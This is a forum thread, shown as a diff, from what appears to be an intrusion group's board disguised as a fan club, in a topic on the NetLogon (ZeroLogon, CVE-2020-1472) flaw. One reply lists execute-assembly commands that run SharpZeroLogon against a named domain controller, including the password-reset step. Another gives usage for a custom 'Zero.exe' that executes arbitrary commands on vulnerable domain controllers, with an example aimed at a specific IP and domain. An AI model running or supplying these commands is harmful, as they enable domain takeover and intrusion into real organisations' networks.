@@ -1,0 +1,111 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Privilege Escalation "
+    NetLogon (CVE-2020-1472)
+
+NetLogon (CVE-2020-1472)
+Alter - 3 - 42
+" previous topic next topic "
+
+Pages: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        View Profile Private Message (Offline)
+
+: February 05, 2021, 11:48:52 am
+Written by
+
+Post
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        View Profile E-mail Private Message (Offline)
+
+Response #1 : July 01, 2021, 03:20:14 am
+Written by
+
+
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local
+execute-assembly /home/user/softs/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local -reset
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local -patch
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        View Profile E-mail Private Message (Offline)
+
+Response #2 : July 01, 2021, 03:42:54 am
+Written by
+
+Zero.exe of our design ::
+
+Cite
+
+    USAGE: ZERO.EXE IP DC DOMAIN ADMIN_USERNAME [-c] COMMAND [-remote]:
+    ---------------------------------------------
+    where:
+    IP - ip address of domain controller
+    DC - domain controller name
+    DOMAIN - domain name, e.g. home.local
+    ADMIN_USERNAME - account name of the administrator. can be default <Administrator> or something else
+    -c - optional, use it when command is not binary executable itself
+    COMMAND - command that will be executed on domain controller. should be surrounded by quotes
+    -remote - if target is outside of current subnet
+
+
+    or
+
+    ZERO.EXE -test IP DC
+    to test if the target is vulnurable only
+
+
+    Executing code on a vulnerable ZeroLogon DC:
+    zero.exe 192.168.22.5 CCGPDC cccnetwork.com Administrator -c "whoami > C:\ProgramData\loggg5.txt"
+
+
+    192.168.22.5 - ipac PDC
+    GCCPDC - PDC hostname
+    cccnetwork.com - domain
+    Administrator - Any YES
+    -c > command which is executed from the system
+
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Privilege Escalation "
+    NetLogon (CVE-2020-1472)
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
